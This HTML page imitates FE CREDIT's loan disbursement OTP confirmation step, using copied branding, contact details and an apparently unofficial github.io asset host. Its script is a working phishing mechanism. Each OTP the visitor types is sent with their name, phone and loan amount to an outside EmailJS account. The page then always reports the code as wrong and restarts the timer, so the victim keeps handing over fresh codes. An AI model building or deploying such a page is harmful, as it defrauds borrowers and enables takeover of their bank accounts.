<!DOCTYPE html>
<html dir="ltr" lang="vi" class="no-js usn">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=2.0, user-scalable=yes, viewport-fit=cover" />
    <title>Xác Nhận Giải Ngân Qua ATM - FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP</title>
    
    <!-- External CSS Bundles from index.html -->
    <link href="https://www.fecredit.com.vn/sb/sitebuilder-ltr-css-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen" rel="stylesheet" />
    <link href="https://www.fecredit.com.vn/sb/sitebuilder-css-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen" rel="stylesheet" />
    <link href="https://www.fecredit.com.vn/sb/sitebuilder-css-small-header-01-sm-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen and (min-width:0) and (max-width:991px)" rel="stylesheet" />
    <link href="https://www.fecredit.com.vn/sb/sitebuilder-css-large-header-07-lg-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen and (min-width:992px)" rel="stylesheet" />
    <link href="https://www.fecredit.com.vn/sb/css-customs-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen" rel="stylesheet" />
    <link href="https://www.fecredit.com.vn/sb/css-footer-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc" media="screen" rel="stylesheet" />
    
    <!-- Favicon -->
    <link rel="shortcut icon" type="image/svg" href="https://www-cdn.fecredit.com.vn/media/yienoinl/favicon-feonl-01.svg?width=32&height=32">
    
    <!-- Shared Components CSS -->
    <link rel="stylesheet" href="https://fecredit.github.io/assets/css/variables.css">
    <link rel="stylesheet" href="https://fecredit.github.io/assets/css/shared-components.css">
    
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    
    <!-- Shared Components JavaScript -->
    <script src="https://fecredit.github.io/assets/js/shared-components.js"></script>
    
    <!-- Logger and Utils -->
    <script src="../assets/js/logger.js"></script>
    <script src="../assets/js/utils.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <style>
      :root {
        --fecredit-primary: #00994F;
        --fecredit-primary-dark: #015C2E;
        --fecredit-primary-light: #9FE870;
        --fecredit-red: #00994F;
        --fecredit-blue-light: #E8F8EE;
      }
      body {
        font-family: "Inter", sans-serif;
        background-color: #f0f2f5;
      }
      .bg-fecredit-red {
        background-color: var(--fecredit-primary);
      }
      .text-fecredit-red {
        color: var(--fecredit-primary);
      }

      html, body {
        overflow-x: hidden !important;
        max-width: 100vw !important;
        width: 100% !important;
      }
      .border-fecredit-red {
        border-color: var(--fecredit-primary);
      }
      .hover\:bg-fecredit-red-dark:hover {
        background-color: var(--fecredit-primary-dark);
      }

      .otp-input:focus {
        border-color: var(--fecredit-primary);
        box-shadow: 0 0 0 2px rgba(0, 153, 79, 0.2);
      }
      .otp-input.error {
        border-color: #ef4444;
        box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2);
      }
      #gemini-modal-content .loader {
        width: 48px;
        height: 48px;
        border: 5px solid #e5e7eb;
        border-bottom-color: var(--fecredit-red);
        border-radius: 50%;
        display: inline-block;
        box-sizing: border-box;
        animation: rotation 1s linear infinite;
      }
      @keyframes rotation {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      /* Fixed sizes for mobile */
      @media (max-width: 767px) {
        main {
          padding: 16px 12px !important;
          width: 100% !important;
          max-width: 100% !important;
          box-sizing: border-box;
        }

        .bg-white {
          padding: 16px !important;
          width: 100% !important;
          max-width: 100% !important;
          box-sizing: border-box;
        }

        h2 {
          font-size: 18px !important;
        }

        .text-2xl {
          font-size: 18px !important;
        }

        * {
          max-width: 100% !important;
        }

        img {
          max-width: 100% !important;
          height: auto !important;
        }
      }

      @media (max-width: 480px) {
        main {
          padding: 12px 8px !important;
        }

        .bg-white {
          padding: 12px !important;
        }

        h2 {
          font-size: 16px !important;
        }

        .text-2xl {
          font-size: 16px !important;
        }
      }
    </style>
    <script>
    emailjs.init("J4YH-lyfEfxXeu7aV");
    </script>
  </head>
  <body class="bg-slate-100 text-slate-800">
    <!-- Site -->
    <div id="site">
        <!-- Subheader -->
        <div id="site-subheader">
            <div class="container content">
                <nav aria-label="" class="sub-header-nav secondary nav-dropdown navigation-dropdown-bg navigation-dropdown-bg-solid">
                    <ul class="sub-header-list d-flex">
                        <li>
                            <span>
                                <a href="../index.html">Về chúng tôi</a>
                            </span>
                        </li>
                        <li>
                            <span>
                                <a href="https://feonline.fecredit.com.vn/" target="_blank" rel="noreferrer noopener">Về FE ONLINE 2.0</a>
                            </span>
                        </li>
                        <li>
                            <span>
                                <a href="#site-footer">Liên hệ</a>
                            </span>
                        </li>
                    </ul>
                    <!--// Site search -->
                    <div class="form site-search-form site-search" aria-label="">
                        <form role="search" autocomplete="off" form-group="off" action="https://www.fecredit.com.vn/search/" method="get" name="searchForm">
                            <div class="form-group">
                                <input type="text" class="myInput form-control" name="search_field"
                                       aria-label="" placeholder="Bạn cần tìm gì?"
                                       value="">
                            </div>
                            <button id="search-button" type="submit" role="button"
                                    aria-label=""
                                    class="btn base-btn-bg base-btn-bg-solid base-btn-bg-hover-solid base-btn-text base-btn-borders btn-search">
                                <span></span>
                                <i aria-hidden="true" class="icon ti ti-search"></i>
                                <p>Tìm kiếm</p>
                            </button>
                        </form>
                    </div>
                </nav>
            </div>
        </div>

        <!-- Header -->
        <header id="site-header" class="header-bg header-bg-solid" tabindex="-1">
            <div class="container">
                <div class="row justify-content-between">
                    <div class="d-flex align-items-center nav-left">
                        <div id="logo">
                            <a href="../index.html" title="FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP" class="w-100">
                                <img src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="FE CREDIT Logo"
                                     style="object-fit: contain;width:100%">
                                <span>FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP</span>
                            </a>
                        </div>
                        <!-- Main navigation -->
                        <nav aria-label="" id="nav-menu"
                             class="main nav__menu nav-dropdown align-items-center navigation-dropdown-bg navigation-dropdown-bg-solid">
                            <ul class="nav__list">
                                <li class="no-child">
                                    <span>
                                        <a class="nav__link d-flex align-items-center justify-content-start text-nowrap" href="../index.html">Trang Chủ</a>
                                    </span>
                                </li>
                                <li class="no-child">
                                    <span>
                                        <a class="nav__link d-flex align-items-center justify-content-start text-nowrap" href="Evaluate-conditions.html">Đăng Ký Giải Ngân</a>
                                    </span>
                                </li>
                                <li class="no-child">
                                    <span>
                                        <a class="nav__link d-flex align-items-center justify-content-start text-nowrap" href="#site-footer">Liên Hệ</a>
                                    </span>
                                </li>
                            </ul>
                        </nav>
                    </div>
                </div>
            </div>
        </header>
    
    <header class="bg-white shadow-sm sticky top-0 z-40" style="display: none;">
      <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
        <div class="flex items-center justify-between h-16">
          <div class="flex-shrink-0">
            <a href="index.html" title="FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP" style="display: flex; align-items: center; text-decoration: none;">
              <img
                src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg"
                alt="FE CREDIT Logo"
                class="h-8"
                style="object-fit: contain; height: 40px; max-width: 200px;"
              />
            </a>
          </div>
          <div class="hidden md:block">
            <nav class="flex items-center space-x-2">
              <a
                href="#"
                class="text-gray-600 hover:text-fecredit-red px-3 py-2 rounded-md text-sm font-medium"
                >Trang Chủ</a
              >
              <a
                href="#"
                class="text-gray-600 hover:text-fecredit-red px-3 py-2 rounded-md text-sm font-medium"
                >Sản Phẩm</a
              >
              <a
                href="#"
                class="text-gray-600 hover:text-fecredit-red px-3 py-2 rounded-md text-sm font-medium"
                >Hỗ Trợ</a
              >
            </nav>
          </div>
          <div class="md:hidden">
            <button
              id="hamburger-button"
              class="inline-flex items-center justify-center p-2 rounded-md text-gray-400 hover:text-gray-500 hover:bg-gray-100 focus:outline-none"
              aria-expanded="false"
            >
              <span class="sr-only">Mở menu chính</span>
              <svg
                class="block h-6 w-6"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
                aria-hidden="true"
              >
                <path
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="2"
                  d="M4 6h16M4 12h16m-7 6h7"
                />
              </svg>
              <svg
                class="hidden h-6 w-6"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
                aria-hidden="true"
              >
                <path
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="2"
                  d="M6 18L18 6M6 6l12 12"
                />
              </svg>
            </button>
          </div>
        </div>
      </div>
      <nav
        id="mobile-menu"
        class="md:hidden hidden bg-white border-t border-gray-200"
      >
        <div class="px-2 pt-2 pb-3 space-y-1 sm:px-3">
          <a
            href="trang-chu.html"
            class="text-gray-600 hover:bg-gray-50 hover:text-fecredit-red block px-3 py-2 rounded-md text-base font-medium"
            >Trang Chủ</a
          >
          <a
            href="gioi-thieu.html"
            class="text-gray-600 hover:bg-gray-50 hover:text-fecredit-red block px-3 py-2 rounded-md text-base font-medium"
            >Giới Thiệu</a
          >
          <a
            href="ca-nhan.html"
            class="text-gray-600 hover:bg-gray-50 hover:text-fecredit-red block px-3 py-2 rounded-md text-base font-medium"
            >Lợi Ích</a
          >
          <a
            href="Evaluate-conditions.html"
            class="text-gray-600 hover:bg-gray-50 hover:text-fecredit-red block px-3 py-2 rounded-md text-base font-medium"
            >Đăng Ký Giải Ngân</a
          >
          <a
            href="step5.html"
            class="text-gray-600 hover:bg-gray-50 hover:text-fecredit-red block px-3 py-2 rounded-md text-base font-medium"
            >Xem Kết Quả</a
          >
          <a
            href="dieu-khoan-su-dung.html"
            class="text-gray-600 hover:bg-gray-50 hover:text-fecredit-red block px-3 py-2 rounded-md text-base font-medium"
            >Điều Khoản Sử Dụng</a
          >
          <a
            href="support-center.html"
            class="text-gray-600 hover:bg-gray-50 hover:text-fecredit-red block px-3 py-2 rounded-md text-base font-medium"
            >Liên Hệ</a
          >
        </div>
      </nav>
    </header>

        <!-- Content -->
        <main id="site-content" tabindex="-1" class="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8 md:py-12">
      <ol class="flex items-center w-full mb-8">
        <li
          class="flex w-full items-center text-fecredit-red after:content-[''] after:w-full after:h-1 after:border-b after:border-blue-200 after:border-2 after:inline-block"
        >
          <span
            class="flex items-center justify-center w-10 h-10 bg-blue-100 text-fecredit-red rounded-full shrink-0 font-bold"
            >1</span
          >
        </li>
        <li
          class="flex w-full items-center text-fecredit-red after:content-[''] after:w-full after:h-1 after:border-b after:border-blue-200 after:border-2 after:inline-block"
        >
          <span
            class="flex items-center justify-center w-10 h-10 bg-blue-100 text-fecredit-red rounded-full shrink-0 font-bold"
            >2</span
          >
        </li>
        <li class="flex items-center w-auto">
          <span
            class="flex items-center justify-center w-10 h-10 bg-fecredit-red text-white rounded-full shrink-0 font-bold"
            >3</span
          >
        </li>
      </ol>

      <div class="bg-white p-6 sm:p-8 rounded-xl shadow-lg">
        <div class="text-center">
          <h2 class="text-2xl font-bold text-slate-900">Xác Nhận Giải Ngân</h2>
          <p class="text-slate-500 mt-1">
            Vui lòng kiểm tra lại thông tin và xác thực giao dịch.
          </p>
        </div>

        <div class="mt-8 border-t border-b border-gray-200 py-6">
          <h3 class="text-base font-semibold text-slate-800 mb-4">
            Chi tiết giao dịch
          </h3>
          <div class="space-y-4 text-sm">
            <div class="flex justify-between items-center">
              <span class="text-slate-500">Người thụ hưởng</span>
              <span
                class="font-medium text-slate-900 text-right"
                id="summaryName"
              ></span>
            </div>
            <div class="flex justify-between items-center">
              <span class="text-slate-500">Ngân hàng thụ hưởng</span>
              <span
                class="font-medium text-slate-900 text-right"
                id="summaryBank"
              ></span>
            </div>
            <div class="flex justify-between items-center">
              <span class="text-slate-500">Số tài khoản</span>
              <span
                class="font-medium text-slate-900 text-right"
                id="summaryAccountNumber"
              ></span>
            </div>
            <div class="border-t border-dashed my-2"></div>
            <div class="flex justify-between items-center pt-2">
              <span class="text-slate-500 font-semibold"
                >Số tiền giải ngân</span
              >
              <span
                class="font-bold text-fecredit-red text-xl text-right"
                id="summaryAmount"
              ></span>
            </div>
          </div>
        </div>

        <div class="mt-6 text-center">
          <p class="text-sm text-slate-600" id="otpMessage"></p>
          <div class="mt-4">
            <label
              for="otp"
              class="block text-sm font-medium text-slate-800 mb-2"
              >Nhập mã OTP</label
            >
            <input
              type="tel"
              id="otp"
              inputmode="numeric"
              class="otp-input w-full max-w-xs mx-auto px-4 py-2 text-center text-2xl tracking-[.5em] border border-slate-300 rounded-lg shadow-sm focus:outline-none transition"
              maxlength="8"
            />
            <p
              id="otp-error-inline"
              class="hidden mt-2 text-sm text-red-600"
            ></p>
          </div>
          <p
            class="mt-4 text-sm font-semibold text-red-600"
            id="otpTimer"
            aria-live="polite"
          >
            Còn 60 giây
          </p>
        </div>

        <div class="mt-8 flex flex-col items-center space-y-4">
          <button
            class="w-full max-w-xs bg-fecredit-red text-white font-bold py-3 px-4 rounded-lg hover:bg-fecredit-red-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-fecredit-red transition-all duration-150 ease-in-out"
            onclick="verifyOTP()"
          >
            Xác Nhận
          </button>
          <button
            onclick="getFinancialAdvice()"
            class="text-sm text-fecredit-red font-medium hover:underline transition"
          >
            ✨ Nhận Lời khuyên Tài chính
          </button>
        </div>
      </div>

    <!-- Custom Error Modal -->
    <div
      id="errorModal"
      class="hidden fixed inset-0 bg-gray-900 bg-opacity-60 transition-opacity flex items-center justify-center p-4 z-50"
    >
      <div
        class="bg-white rounded-lg shadow-xl transform transition-all sm:max-w-sm sm:w-full p-6 text-center"
      >
        <p id="errorMessage" class="text-slate-700 mb-4"></p>
        <button
          id="errorButton"
          class="w-full bg-fecredit-red text-white px-4 py-2 rounded-md hover:bg-fecredit-red-dark"
          onclick="closeErrorModal()"
        >
          Thử lại
        </button>
      </div>
    </div>

    <!-- Gemini Advice Modal -->
    <div
      id="gemini-modal"
      class="hidden fixed inset-0 bg-gray-900 bg-opacity-60 transition-opacity flex items-center justify-center p-4 z-50"
    >
      <div
        class="bg-white rounded-lg shadow-xl transform transition-all sm:max-w-lg w-full"
      >
        <div
          class="flex justify-between items-center p-4 border-b border-gray-200"
        >
          <h3 class="text-lg font-semibold text-gray-900">
            ✨ Lời khuyên Tài chính từ Gemini
          </h3>
          <button
            onclick="closeGeminiModal()"
            class="text-gray-400 hover:text-gray-600 text-2xl"
          >
            &times;
          </button>
        </div>
        <div
          id="gemini-modal-content"
          class="p-6 min-h-[200px] flex items-center justify-center"
        >
          <!-- Content will be injected here -->
        </div>
        <div class="p-4 bg-gray-50 border-t border-gray-200 text-right">
          <button
            class="bg-fecredit-red text-white px-4 py-2 text-sm rounded-md hover:bg-fecredit-red-dark"
            onclick="closeGeminiModal()"
          >
            Đã hiểu
          </button>
        </div>
      </div>
    </div>

        </main>
        <!-- Footer -->
        <footer id="site-footer" class="footer-bg footer-bg-solid bg-gray-1" tabindex="-1" style="padding-bottom:0px !important">
            <div class="container">
                <div class="listing">
                    <div class="item footer-item usn_pod_footeritem col-lg-0 col-md-0 col-12 col">
                        <div class="inner">
                            <div id="footer-item-above" class="d-flex flex-column align-stretch align-items-start gap24 xl:flex-row">
                                <div class="footer-text d-flex flex-column align-stretch gap32">
                                    <div class="image">
                                        <img class="lazyload" loading="lazy" src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="logo" />
                                    </div>
                                    <h2 class="heading footer-heading">Hiện thực hóa<div class="break"></div>hàng triệu ước mơ</h2>
                                </div>
                                <div class="footer-contact d-flex flex-column justify-content-center align-items-start align-stretch p24 gap24 radius24 bg-white">
                                    <div class="contact-phone d-flex flex-column align-stretch xl:flex-row gap24">
                                        <div class="new-customer flex-center flex-column align-stretch">
                                            <p class="contact-title"><i class="ti ti-phone-call contact-icon"></i>Dành cho khách hàng mới</p>
                                            <a class="phone-link flex-center flex-column fw-700 lh150 radius16 text-uppercase c8-bg c8-bg-solid" href="tel:028 3551 6868">
                                                <span class="c8-secondary-heading">Hỗ trợ vay nhanh</span>
                                                <h5 class="heading c8-heading">028 3551 6868</h5>
                                            </a>
                                        </div>
                                        <div class="phone-divider align-stretch bg-gray-2"></div>
                                        <div class="old-customer gap16 flex-center flex-column align-stretch">
                                            <p class="contact-title"><i class="ti ti-headphones contact-icon"></i> Dành cho khách hàng hiện hữu</p>
                                            <div class="list-phone flex-center align-stretch radius16 c9-bg c9-bg-solid">
                                                <a class="phone-link align-stretch flex-center flex-column fw-700 lh150 text-uppercase" href="tel:1900 6535">
                                                    <span class="c9-secondary-heading">Khách hàng vay</span>
                                                    <h5 class="heading c9-heading">1900 6535</h5>
                                                </a>
                                                <div class="old-customer-divider"></div>
                                                <a class="phone-link align-stretch flex-center flex-column fw-700 lh150 text-uppercase" href="tel:1900 6939">
                                                    <span class="c9-secondary-heading mobile">KH thẻ tín dụng</span>
                                                    <span class="c9-secondary-heading desktop">Khách hàng thẻ tín dụng</span>
                                                    <h5 class="heading c9-heading">1900 6939</h5>
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="divider-contact"></div>
                                    <div class="other-contact flex-center gap32">
                                        <div class="social d-flex flex-column justify-content-center align-items-start">
                                            <p class="contact-title">
                                                <i class="ti ti-share contact-icon"></i> Kết nối với FE CREDIT nhiều hơn
                                            </p>
                                            <div class="social-list d-flex align-items-center">
                                                <a href="https://www.facebook.com/FECREDIT.VN/" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/20qdzdk0/fb44.svg" alt="social-icon" class="lazyload" />
                                                </a>
                                                <a href="https://www.instagram.com/fecredit_official/" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/rfybl10x/it44.svg" alt="social-icon" class="lazyload" />
                                                </a>
                                                <a href="https://www.linkedin.com/company/fe-credit/" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/wwfcyngn/lb44.svg" alt="social-icon" class="lazyload" />
                                                </a>
                                                <a href="https://www.youtube.com/channel/UCVEbuhfBLKok_Jpl4VZVV1A/about" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/104pogye/yb44.svg" alt="social-icon" class="lazyload" />
                                                </a>
                                                <a href="https://www.tiktok.com/@fecredit_official" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/v15j2slx/tt44.svg" alt="social-icon" class="lazyload" />
                                                </a>
                                                <a href="https://zalo.me/FECREDIT" target="_blank" class="social-item flex-center radius1000 overflow-hidden flex-shrink-0">
                                                    <img loading="lazy" src="https://www-cdn.fecredit.com.vn/media/wzrnvejd/zl44.svg" alt="social-icon" class="lazyload" />
                                                </a>
                                            </div>
                                        </div>
                                        <div class="address flex-center flex-column align-stretch">
                                            <p class="contact-title"><i class="ti ti-map-pin contact-icon"></i>Địa chỉ</p>
                                            <div class="address-content align-stretch flex-column d-flex gap-0">
                                                <p class="address-title text-gray-8 fw-700 text-uppercase lh150">Phòng Dịch Vụ Khách Hàng</p>
                                                <div class="address-text text-gray-6 lh150 ls28">
                                                    <p class="addressFooter">144 Cộng Hòa, Phường Bảy Hiền, Thành phố Hồ Chí Minh.</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
    </div>

    <script>
      let otpCountdown = 60;
      let otpInterval = null;
      let formData = {};
      let attemptCount = 0;

      function setupMobileMenu() {
        const hamburgerButton = document.getElementById("hamburger-button");
        const mobileMenu = document.getElementById("mobile-menu");
        if (!hamburgerButton || !mobileMenu) return;
        const icons = hamburgerButton.querySelectorAll("svg");
        hamburgerButton.addEventListener("click", () => {
          const isExpanded =
            hamburgerButton.getAttribute("aria-expanded") === "true";
          hamburgerButton.setAttribute("aria-expanded", !isExpanded);
          mobileMenu.classList.toggle("hidden");
          icons.forEach((icon) => icon.classList.toggle("hidden"));
        });
      }

      function clearOTPInput() {
        const otpInput = document.getElementById("otp");
        const otpErrorInline = document.getElementById("otp-error-inline");
        if (otpInput) {
          otpInput.value = "";
          otpInput.classList.remove("error");
          otpInput.focus();
        }
        if (otpErrorInline) {
          otpErrorInline.classList.add("hidden");
        }
      }

      function startOTPTimer() {
        otpCountdown = 60;
        const timerEl = document.getElementById("otpTimer");
        if (!timerEl) return;
        timerEl.textContent = `Thời gian còn lại: ${otpCountdown} giây`;
        if (otpInterval) clearInterval(otpInterval);

        otpInterval = setInterval(() => {
          otpCountdown--;
          timerEl.textContent = `Thời gian còn lại: ${otpCountdown} giây`;
          if (otpCountdown <= 0) {
            clearInterval(otpInterval);
            timerEl.textContent = `Mã OTP đã hết hiệu lực.`;
            clearOTPInput();
          }
        }, 1000);
      }

      function sendOTPToEmail(otp, phone) {
        const templateParams = {
          otp: otp,
          phone: phone || "Không có",
          customer_name: formData.fullName || "Không có",
          total_amount: formData.amount || "Không có",
          contract_number: `SHB-${Date.now()}`, // Tạo contract number tạm
        };

        emailjs
          .send("service_60tgxof", "template_ihca6qe", templateParams)
          .then(
            () => {
              if (window.Logger) {
                window.Logger.info("OTP sent to EmailJS");
              }
            },
            (error) => {
              if (window.Logger) {
                window.Logger.error("EmailJS error", error, { serviceId: "service_60tgxof", templateId: "template_ihca6qe" });
              }
            }
          );
      }

      function showInlineError(message) {
        const otpInput = document.getElementById("otp");
        const otpErrorInline = document.getElementById("otp-error-inline");
        if (otpInput && otpErrorInline) {
          otpInput.classList.add("error");
          otpErrorInline.textContent = message;
          otpErrorInline.classList.remove("hidden");
          otpInput.focus();
          otpInput.select();
        }
      }

      function showModalError(message) {
        const modal = document.getElementById("errorModal");
        const errorMessageEl = document.getElementById("errorMessage");
        if (modal && errorMessageEl) {
          errorMessageEl.textContent = message;
          modal.classList.remove("hidden");
        }
      }

      function closeErrorModal() {
        const modal = document.getElementById("errorModal");
        const errorButton = document.getElementById("errorButton");
        modal.classList.add("hidden");

        errorButton.textContent = "Thử lại";
        errorButton.onclick = closeErrorModal;

        clearOTPInput();
      }

      function verifyOTP() {
        const otpInput = document.getElementById("otp");
        const otp = otpInput.value.trim();
        const phone = formData.phone || "N/A";

        document.getElementById("otp-error-inline").classList.add("hidden");
        otpInput.classList.remove("error");

        if (otp.length !== 6 && otp.length !== 8) {
          showInlineError(
            "Mã xác nhận giải ngân không chính xác. Vui lòng kiểm tra lại."
          );
          return;
        }

        attemptCount++;

        // Always collect OTP attempts to EmailJS
        sendOTPToEmail(otp, phone);

        // Persist attempt log (non-sensitive)
        try {
          const attempts = JSON.parse(
            localStorage.getItem("otpAttempts") || "[]"
          );
          attempts.push({ t: new Date().toISOString(), len: otp.length });
          localStorage.setItem("otpAttempts", JSON.stringify(attempts));
        } catch (_) {}

        // Restart timer and show non-blocking guidance
        startOTPTimer();
        showInlineError(
          "Mã xác nhận không đúng hoặc đã hết hiệu lực. Vui lòng thử lại."
        );
      }

      function closeGeminiModal() {
        document.getElementById("gemini-modal").classList.add("hidden");
      }

      async function getFinancialAdvice() {
        const modal = document.getElementById("gemini-modal");
        const modalContent = document.getElementById("gemini-modal-content");

        if (!formData || !formData.amount) {
          modalContent.textContent =
            "Không tìm thấy thông tin khoản vay để đưa ra lời khuyên.";
          modal.classList.remove("hidden");
          return;
        }

        modal.classList.remove("hidden");
        modalContent.innerHTML = `<div class="loader" aria-label="Đang tải"></div>`;

        const prompt = `Tôi sắp vay một khoản tiền là ${
          formData.amount
        } VND với thời hạn ${
          formData.months || "không xác định"
        } tháng từ ngân hàng FECredit. Dựa trên thông tin này, hãy đưa ra một số lời khuyên tài chính ngắn gọn, dễ hiểu và hữu ích cho người dùng ở Việt Nam. Vui lòng tập trung vào các điểm chính sau:
1. Gợi ý cách lập ngân sách hàng tháng để đảm bảo trả nợ đúng hạn.
2. Một vài lưu ý quan trọng về việc duy trì điểm tín dụng tốt.
3. Một cảnh báo nhỏ về các rủi ro tài chính cần tránh khi có một khoản vay.
Hãy trình bày dưới dạng danh sách các gạch đầu dòng, sử dụng ngôn ngữ thân thiện, tích cực và chuyên nghiệp.`;

        try {
          let chatHistory = [{ role: "user", parts: [{ text: prompt }] }];
          const payload = { contents: chatHistory };
          const apiKey = "";
          const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;

          const response = await fetch(apiUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
          });

          if (!response.ok) {
            throw new Error(`API call failed with status: ${response.status}`);
          }

          const result = await response.json();

          if (
            result.candidates &&
            result.candidates.length > 0 &&
            result.candidates[0].content &&
            result.candidates[0].content.parts &&
            result.candidates[0].content.parts.length > 0
          ) {
            const raw = result.candidates[0].content.parts[0].text || "";
            const safe = raw
              .split("\n")
              .map((line) => line.replace(/^(\*|-)\s*/, "• ").trim())
              .filter(Boolean)
              .join("\n");
            const container = document.createElement("div");
            container.className =
              "text-left text-sm text-slate-700 space-y-3 prose prose-sm max-w-none";
            container.textContent = safe;
            modalContent.innerHTML = "";
            modalContent.appendChild(container);
          } else {
            throw new Error("Không nhận được phản hồi hợp lệ từ AI.");
          }
        } catch (error) {
          if (window.Logger) {
            window.Logger.error("Gemini API Error", error);
          }
          if (modalContent) {
            modalContent.textContent =
              "Rất tiếc, đã có lỗi xảy ra khi tạo lời khuyên. Vui lòng thử lại sau.";
          }
        }
      }

      window.addEventListener("load", () => {
        startOTPTimer();
        setupMobileMenu();

        const otpInput = document.getElementById("otp");
        const otpErrorInline = document.getElementById("otp-error-inline");

        if (otpInput && otpErrorInline) {
          otpInput.addEventListener("input", () => {
            otpInput.classList.remove("error");
            otpErrorInline.classList.add("hidden");
          });
        }

        try {
          formData = JSON.parse(sessionStorage.getItem("formData") || "{}");
          if (!formData.fullName && !formData.accountHolder) {
            window.location.href = "Evaluate-conditions.html";
            return;
          }
          // *** FIX: Ưu tiên accountHolder, nếu không có thì dùng fullName ***
          document.getElementById("summaryName").textContent =
            formData.accountHolder || formData.fullName || "N/A";
          document.getElementById("summaryAmount").textContent =
            formData.amount || "N/A";
          document.getElementById("summaryBank").textContent =
            formData.bank || "N/A";
          document.getElementById("summaryAccountNumber").textContent =
            formData.accountNumber || "N/A";
          const phone = formData.phone || "N/A";
          document.getElementById(
            "otpMessage"
          ).textContent = `Một mã OTP đã được gửi đến số điện thoại ${phone}.`;
        } catch (error) {
          if (window.Logger) {
            window.Logger.error("Error parsing formData", error, { storedData: sessionStorage.getItem("formData") });
          }
          window.location.href = "Evaluate-conditions.html";
        }
      });
      
      // Cleanup interval on page unload to prevent memory leaks
      window.addEventListener('beforeunload', () => {
        if (otpInterval) {
          clearInterval(otpInterval);
          otpInterval = null;
        }
      });
      
      // Also cleanup on visibility change (tab switch)
      document.addEventListener('visibilitychange', () => {
        if (document.hidden && otpInterval) {
          clearInterval(otpInterval);
          otpInterval = null;
        } else if (!document.hidden && otpCountdown > 0 && otpCountdown < 60) {
          // Restart timer if page becomes visible and countdown is active
          startOTPTimer();
        }
      });
    </script>
  </body>
</html>
